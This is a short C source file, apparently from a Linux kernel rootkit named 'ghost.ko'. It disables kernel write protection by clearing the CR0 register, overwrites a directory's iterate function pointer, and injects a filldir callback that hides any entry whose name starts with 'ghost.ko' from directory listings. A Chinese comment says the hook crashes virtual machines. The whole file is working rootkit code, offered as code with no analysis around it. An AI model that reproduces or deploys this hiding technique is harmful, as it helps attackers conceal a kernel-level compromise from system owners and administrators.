#include "vfs_hook.h"
#include "cr0.h"

hook_backup vfs_module = {0};

int vfs_hook(const char *path, iterate_t *orig_iterate, iterate_t hook_iterate)
{
	struct file *filep = NULL;
	unsigned cr0;

	filep = filp_open(path, O_RDONLY | O_DIRECTORY, 0);
	if(IS_ERR(filep)) return -1;
	*orig_iterate = filep->f_op->iterate;
	
	cr0 = clear_cr0();
	*(iterate_t *) &filep->f_op->iterate = hook_iterate;
	setback_cr0(cr0);
	
	filp_close(filep, 0);

	return 0;
}

int vfs_unhook(const char *path, iterate_t orig_iterate)
{
	struct file *filep = NULL;
	unsigned cr0;
	
	filep = filp_open(path, O_RDONLY | O_DIRECTORY, 0);
	if(IS_ERR(filep)) return -1;
	
	cr0 = clear_cr0();
	*(iterate_t *) &filep->f_op->iterate = orig_iterate;
	setback_cr0(cr0);
	
	filp_close(filep, 0);
	
	return 0;
}

int new_filldir(void * __buf, const char * name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	//BUG: 导致开vm虚拟机死机，原因不明
	if(*(unsigned long *) "ghost.ko" == *(unsigned long *) name)
		return 0;
	if(vfs_module.actor)
		return (*vfs_module.actor)(__buf, name, namlen, offset, ino, d_type);
	
	return 0;
}
		   
int new_iterate(struct file *file, struct dir_context *ctx)
{
	*(filldir_t *) &vfs_module.actor = ctx->actor; 
	*(filldir_t *) &ctx->actor = new_filldir;
	if(vfs_module.iterate)
		return (*vfs_module.iterate)(file, ctx);
	return 0;
}
